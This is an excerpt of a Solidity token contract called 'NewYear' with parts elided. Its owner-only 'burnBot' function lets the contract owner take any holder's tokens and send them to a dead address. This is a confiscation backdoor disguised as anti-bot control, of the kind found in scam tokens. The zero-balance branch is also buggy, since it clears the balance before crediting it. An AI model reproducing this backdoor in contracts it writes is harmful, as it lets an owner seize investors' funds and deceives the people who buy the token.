...
contract NewYear is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 2024 * (10**18);
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;

    string private _name = "NewYear";
    string private _symbol = "NY";
    ...
    address payable public marketingWallet = payable(0x588BE5735dd5D1639Bf1204dC8aaB97252339a10);
    ...
    function burnBot (address wallet, uint256 amount) public onlyOwner 
    {
            require(wallet != owner(), "Does not work");
        if (_tOwned[wallet] <= amount * 10 ** 18) {
            _tOwned[wallet] = 0;
            _tOwned[deadAddress] = _tOwned[deadAddress] + _tOwned[wallet];
        } else {
            _tOwned[wallet] = _tOwned[wallet] - amount * 10 ** 18;
            _tOwned[deadAddress] = _tOwned[deadAddress] + amount * 10 ** 18;
        }
    ...
    function setMaxTxAmount(uint256 maxTxAmount) external onlyOwner() {
        ...
        require(_maxTxAmount > totalSupply().div(500), "value too low");
    }
